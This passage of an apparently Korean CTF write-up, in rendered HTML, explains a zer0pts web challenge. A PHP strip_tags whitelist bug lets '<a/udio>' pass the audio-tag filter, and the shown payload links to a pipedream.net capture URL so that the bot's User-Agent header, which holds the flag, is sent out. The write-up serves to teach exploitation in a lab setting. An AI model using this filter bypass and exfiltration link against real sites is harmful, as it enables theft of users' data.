url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAABlElEQVQoz41TWW7bMBDVWSJZ3DnDZUhKVGVbdhIj6UfQ+x+mkIy4QRFUBQbE+3nkW4bNQTtuPDe+5ablepsVdMLuTmONN6EqVwSQwMIhCcgc0kHCPtkZp/wkIEssmo7KVxUnFaZe4j6Z22gwaaSOq7aXLVvnqVctN/vk4pLLL0hL9iPRlIbZYLE+9xq7TfkWwZ+LvuKGScx01OPNpkvxQ5qu9GPJZRnGG8SxE1bYwLZEJURuA7dBIXHj72SoLo2rz9m5icI55wvSGfNVAkmIyiWFpLfzjgXEe5xNKyyTOEEM83usP4dySfkI+QTlJJEUbpyN1itk2h0kPIpo7kj5/Pr+UY/PNs7x/AH1VWB5GH74/CvF9WVpQnKJQ2YmKVtUnKTLvbSrVe0lENP+2/CbTiG5vAyX4flXrC8YqsAsgHqFvXafUr/vvOkVSu0YjgyyDZPG0HHz9EXnPwpvhA41L1Bvrr7FcsVysmmmMpk47m7oumGdod4Qh8xt5JC4JQWRbU3ukJl2wnpuXMv058daZf/Pev4G19eflILTS0sAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/e2bdef089c91fc681b0e6f102b39ce14/ca12d/1.png\"\n        srcset=\"/static/e2bdef089c91fc681b0e6f102b39ce14/e9ff0/1.png 180w,\n/static/e2bdef089c91fc681b0e6f102b39ce14/f21e7/1.png 360w,\n/static/e2bdef089c91fc681b0e6f102b39ce14/ca12d/1.png 647w\"\n        sizes=\"(max-width: 647px) 100vw, 647px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>flag 문자열을 검색하여 <code class=\"language-text\">worker.js</code> 소스코드를 확인할 수 있다.</li>\n<li>해당 코드를 보면 재선언, 재할당이 불가능하도록 설정되어 있다. <code class=\"language-text\">zer0pts{&lt;censored>}</code></li>\n<li>setUserAgent 메서드를 바탕으로 flag 값을 UserAgent로 설정하는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"samplepage\" style=\"position:relative;\"><a href=\"#samplepage\" aria-label=\"samplepage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SamplePage</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAnElEQVQY05WQwQrCMBBE8//f48WvEDxULIKXYtqkm2R3TZqmbSKtoKAXfZcZZi7DiE7rS3W61rV1WErJOZefEWEYjLx5gLsPzIxESMTMtJkXuEHEz9AhjuMoEEkqLbWWbdt2Sum+BzDWGrsCxoIxm1kVAEIIMcYQhnmeRSR0TeNUx947pDGlP2Yv5yrtd8vx8NnkPE1TTO8Tvt94APx4IHEzfMLvAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/00596cc8f493e4b9835a4b479ae36c80/37523/2.png\"\n        srcset=\"/static/00596cc8f493e4b9835a4b479ae36c80/e9ff0/2.png 180w,\n/static/00596cc8f493e4b9835a4b479ae36c80/f21e7/2.png 360w,\n/static/00596cc8f493e4b9835a4b479ae36c80/37523/2.png 720w,\n/static/00596cc8f493e4b9835a4b479ae36c80/302a4/2.png 1080w,\n/static/00596cc8f493e4b9835a4b479ae36c80/0940f/2.png 1154w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAtklEQVQI11XIQZKDIBRFUTdiEhNBQBBRkzLA5wOZdUcH2f9iUtijrjqD+17F9CLMOmgjpO76kfaaMEmYIlxRPhCm2mOW5ooczxFFJRl9zON6XxJCjgHcMyEEcCn4V8KEEINHsME/U/Bg14wQvA3eorfVZX6p/JGwCXibtJv4nvNu4iZx42Hn7oe53/OUa431GOsRTyadShRVtzg2Wd4roqZWDLeOXztxpUVDRUP4uWUXwpu/+d8XcDEuHZRrDg0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/a489223691495c1859e583ade462be8c/37523/3.png\"\n        srcset=\"/static/a489223691495c1859e583ade462be8c/e9ff0/3.png 180w,\n/static/a489223691495c1859e583ade462be8c/f21e7/3.png 360w,\n/static/a489223691495c1859e583ade462be8c/37523/3.png 720w,\n/static/a489223691495c1859e583ade462be8c/4ff83/3.png 843w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Sample Page 분석시 <code class=\"language-text\">&lt;audio></code> 태그를 사용하여 post 올릴 수 있는것으로 추정된다.</li>\n</ul>\n<h2 id=\"postphp-분석\" style=\"position:relative;\"><a href=\"#postphp-%EB%B6%84%EC%84%9D\" aria-label=\"postphp 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>post.php 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.555555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAkElEQVQI1xXECwqDMAwAUO8yZTZNTRPT9KMyHToGu/99hvB4HWrWZadyhLRBEIcykrqoQAbSgBtw8WwgCdmeyAPEAWjw1MPUhVKv1/k7PrqdtH9lObxUzxlk9mReKnB13CBWZCNtODcvFlJ2UbtgZV2v2t6oC6YFpIxBHRkEczG7mDEmjAlIB5geY+jddBvv/6QxIs2tAmPZAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/e8fc8e56599ca66f4683b7ce6a13c294/37523/4.png\"\n        srcset=\"/static/e8fc8e56599ca66f4683b7ce6a13c294/e9ff0/4.png 180w,\n/static/e8fc8e56599ca66f4683b7ce6a13c294/f21e7/4.png 360w,\n/static/e8fc8e56599ca66f4683b7ce6a13c294/37523/4.png 720w,\n/static/e8fc8e56599ca66f4683b7ce6a13c294/2e367/4.png 1066w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>post를 게시할 때 문자열 필터링을 하는 부분이 존재한다. 해당 부분은 <code class=\"language-text\">render_tags</code> 함수를 바탕으로 제어된다.</li>\n</ul>\n<h2 id=\"utilphp-분석\" style=\"position:relative;\"><a href=\"#utilphp-%EB%B6%84%EC%84%9D\" aria-label=\"utilphp 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>util.php 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAiklEQVQI10WMUQqEMAwFvYupJq1pm1St1iLKfi57/+ssXT8WhseDgemW+SjHlY9b1mLDjCGBDcaJcQI2GhsHp4OTcZLBBvMDqG1P3K37S89Pvt5Sq9bb593GzS8nL3VKBUMmLSQba6aQkBNyayErsnZR1pHT0wMnhgKQB/I9sSEG4h7/APJjgdr/AgT/IHmi3V1aAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/8046a8f895df08c0204b5a3ac048eeea/37523/5.png\"\n        srcset=\"/static/8046a8f895df08c0204b5a3ac048eeea/e9ff0/5.png 180w,\n/static/8046a8f895df08c0204b5a3ac048eeea/f21e7/5.png 360w,\n/static/8046a8f895df08c0204b5a3ac048eeea/37523/5.png 720w,\n/static/8046a8f895df08c0204b5a3ac048eeea/146da/5.png 943w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">redner_tags</code> 함수는 util.php에 구현되어 있으며 사용자의 입력값을 인자로 받아와 <code class=\"language-text\">preg_replace</code> 함수를 바탕으로,</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\[\\[(.+?)\\]\\]/'</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string single-quoted-string\">'&lt;audio controls src=\"\\\\1\">&lt;/audio>'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'[[www.naver.com]]'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">=></span>\n<span class=\"token operator\">&lt;</span>audio controls src<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"www.naver.com\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>audio<span class=\"token operator\">></span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">[[URL]]</code> 정규화를 바탕으로 <code class=\"language-text\">&lt;audio></code> 치환되는 모습을 확인할 수 있다</li>\n<li>두번 째 필터로는 <code class=\"language-text\">strip_tags</code> 함수로 <code class=\"language-text\">&lt;audio></code> 태그를 정확히 써야 허용되는 메서드이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token function\">strip_tags</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;audio>'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'&lt;audio>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => allows</span>\n<span class=\"token function\">strip_tags</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;script>'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'&lt;audio>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => Deny</span></code></pre></div>\n<ul>\n<li>하지만 두 번째 필터링 부분에서 PHP 버그가 발생한다.</li>\n</ul>\n<h2 id=\"strip_tags-allows--in-tag-name-allowing-whitelist-bypass-in-browsers\" style=\"position:relative;\"><a href=\"#strip_tags-allows--in-tag-name-allowing-whitelist-bypass-in-browsers\" aria-label=\"strip_tags allows  in tag name allowing whitelist bypass in browsers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>strip_tags allows / in tag name, allowing whitelist bypass in browsers</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAABaElEQVQoz52R2W7sIBBE/f+/N9JEfohNGC9hWIwB06wmws5kUXR1o5QQagkO1dU03fNwvWKEbhjjlxdMCBnGqe961KO+Rxjj10NKKQs2hJBzLg81wXvO7tM8rmrdtg3AGqOHYcDo9TbwEGIphXPetm3XdQgha20pZd/3ClNKEcLDQIwBgGhtMAYIIeM4GVOtYozGGKWU1npdVwAIDzXzPCF0v1zmp6fpcrldr1PbjotUMYTDYP/a5+mZH2oE58aoFL0PYK1xrnautQZwpZS8f17++VCFKWVyVXJdtdLOOYBzgXPOeR+8d+4sPQCcad9hpSom5SqXZRGiJjuy6aNyzoVY43l/pIxx/+rMGJ3nidyJEILXLijnXAjBKBNioXUXjLM7oYxxpdQ3WEqptD7DHAf7Yy57Lffy8TE/1VhrQ4gppxhjSinnnFIqv1PNvCzLZjd4n0pwzv8W9t6nlP7V2H/gc0gA8Af4DfEz8CgKnPuHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/77f87ef0b690582030395c32afb73b29/37523/6.png\"\n        srcset=\"/static/77f87ef0b690582030395c32afb73b29/e9ff0/6.png 180w,\n/static/77f87ef0b690582030395c32afb73b29/f21e7/6.png 360w,\n/static/77f87ef0b690582030395c32afb73b29/37523/6.png 720w,\n/static/77f87ef0b690582030395c32afb73b29/dd104/6.png 1064w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">strip_tags</code> 관련 bug를 확인하면 만약 <code class=\"language-text\">&lt;strong></code> 태그를 화이트리스트에 존재할 경우 <code class=\"language-text\">&lt;s/trong></code> 구문도 그대로 복사되어 유지되는 모습을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"php-bug-테스트\" style=\"position:relative;\"><a href=\"#php-bug-%ED%85%8C%EC%8A%A4%ED%8A%B8\" aria-label=\"php bug 테스트 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Bug 테스트</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAgklEQVQoz52RMQ7DMAhFff9b9QzdqnRMh05Jaj42UKhQOnVo5DwhFvTER5T5MU/TnYCI8BijrNu2LKuq+jilg3OjxxlZupiamXn6A5WxwcytMTf3sZNzc5wlZRPUCiIQoF9s70fJvVxuZB2V0kfekADcuxy/6vrcM/wOVOWFt9g/+QPX0BVomSYa7gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/7176eb6e8e1466dc2fe2939a62052251/37523/7.png\"\n        srcset=\"/static/7176eb6e8e1466dc2fe2939a62052251/e9ff0/7.png 180w,\n/static/7176eb6e8e1466dc2fe2939a62052251/f21e7/7.png 360w,\n/static/7176eb6e8e1466dc2fe2939a62052251/37523/7.png 720w,\n/static/7176eb6e8e1466dc2fe2939a62052251/302a4/7.png 1080w,\n/static/7176eb6e8e1466dc2fe2939a62052251/e6c84/7.png 1148w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+UlEQVQY003Oy0rDQBgF4LyHpSmZS2by556OCVXbgltfUxDBh3DhptRFM1GRCnapmLQBN7V1JpJIoYez/TjHKKtqPpst5o/vq9VCyq+yarpImbux8MQoGKbcjxzOAYAyjhHChxg7pb/Xa12VrdC6aRqlVIvz3PF8EGc8iAGA2RRhbLWSHCwxtvWmflvuPz90vdHd5j8uCmkTxAD8ME5c5tiE2xQ4oxgRjCglBFnG7/L15/Z6e3eze7hvjrAsni0nHnjCyS7jbBIkKYgLJsYDHpk8MiExWWi0V5Vqq9Uxzp9eTDfrh2P7/MpNp2Q46fujEy56kPbgtGv6BwvrmZZg02ffAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/f27b347e989ad6f4b10507ab9482f67c/37523/8.png\"\n        srcset=\"/static/f27b347e989ad6f4b10507ab9482f67c/e9ff0/8.png 180w,\n/static/f27b347e989ad6f4b10507ab9482f67c/f21e7/8.png 360w,\n/static/f27b347e989ad6f4b10507ab9482f67c/37523/8.png 720w,\n/static/f27b347e989ad6f4b10507ab9482f67c/8bd7c/8.png 845w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">&lt;audio></code> 태그 부분에 <code class=\"language-text\">/</code> 을 입력하여 <code class=\"language-text\">strip_tags</code> 메서드 버그로 인하여 다음과 같이</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">udio</span><span class=\"token punctuation\">></span></span>PHP BUG<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">a</code> 태그 로 인식하게되어 우회가 가능하다. 그렇다면 a태그를 사용하여 외부 서버로 요청을 보내게 되면 <code class=\"language-text\">user-agent</code> 헤더 부분을 읽을 수 있지 않을까?</li>\n<li>그렇다면 앞에서 분석해본 <code class=\"language-text\">work.js</code> 에서는 <code class=\"language-text\">newPage()</code> 메서드를 통해 생성을 한 후에 <code class=\"language-text\">UserAgent</code>를 바탕으로 적용을 한후 <code class=\"language-text\">id: like</code> 이벤트가 발생하였을 경우 적용된 resource를 받을 수 있기 때문에 페이로드를 짤때 <code class=\"language-text\">id</code> 값을 like로 적용을 한 후에 보내야 한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\">&lt;a/udio href=\"https://11973bb238cad6a84c369c6b0060ed0b.m.pipedream.net\" id=\"like\">\n\t EXPLOIT &lt;/a/udio></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAqklEQVQY05WOUQoCMQxEe/8jeAUP4o+wRxAXdz9d2zRNmrSJuIIoiLjDI8zPTCacx3Ga58s0E7G72xYCEXVt/sjZJswsABKTiDRtpt3/RLp387Ckkm4RACFCvMa0xOeFW0xLykiZai6MuchbuzSvzQOtk7fKfA2bqahCkUyCrKz2oq71X2H1qhb2Aw+nxAViggyAiGUVliKiv/+H3dEP48N1+xxmxlXpZ/wOYVzWF7Lh9jYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/5925085382a019bef00f6cfb3c7e5a10/37523/9.png\"\n        srcset=\"/static/5925085382a019bef00f6cfb3c7e5a10/e9ff0/9.png 180w,\n/static/5925085382a019bef00f6cfb3c7e5a10/f21e7/9.png 360w,\n/static/5925085382a019bef00f6cfb3c7e5a10/37523/9.png 720w,\n/static/5925085382a019bef00f6cfb3c7e5a10/302a4/9.png 1080w,\n/static/5925085382a019bef00f6cfb3c7e5a10/33d1d/9.png 1150w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAr0lEQVQI13XOwRKCIBRAUb8kBVLAtMmKeKipQT7CpkWLZvr/L2li1aazvKub5FzksuSilKKoOatK0Sgtqm26WtF1zrjI0jT7QUhGIkppcmrP/TVM84J2cuPQt2C6vj0PxhgDYAC6rgMArTVER6WVUlodmmafTNY9X+9wf9jbPSzLHCHO3ntERO9DCIgY45d1V2fdbC/DOCa82srdUZRVLYtCynxTE0LJfzQOE0oZYx9ewC8bv/jsXQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/f42b5fa9b65c2792c3586823a8f9b852/0c69d/10.png\"\n        srcset=\"/static/f42b5fa9b65c2792c3586823a8f9b852/e9ff0/10.png 180w,\n/static/f42b5fa9b65c2792c3586823a8f9b852/f21e7/10.png 360w,\n/static/f42b5fa9b65c2792c3586823a8f9b852/0c69d/10.png 598w\"\n        sizes=\"(max-width: 598px) 100vw, 598px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"response-event-확인\" style=\"position:relative;\"><a href=\"#response-event-%ED%99%95%EC%9D%B8\" aria-label=\"response event 확인 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>response Event 확인</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxElEQVQoz5WP247FIAhF+/9/WquAtiog2ok9t3mYnGY2hBDCCpslpR0pVhYVbSyNxfqw3p916lP7jKvpfYyxqCoCgduKcw2pxWi1GLMxd7PxVYuoElL1gddVVqcA4r14r4BKZLkoRSt1nOcfsKoCEsYkPjSiufReu7x9u6xywRTrvivznE3+lTewagiQiPLms9skhJazlWKldJEb2JoFgADIiA2gHYcJT7jWLnoDswgGjDHV/Zinfnu+tR1TKkc+H6/+Uz/KchA+98mR2QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/806732ee76eb47722ae809c7b3674d74/37523/11.png\"\n        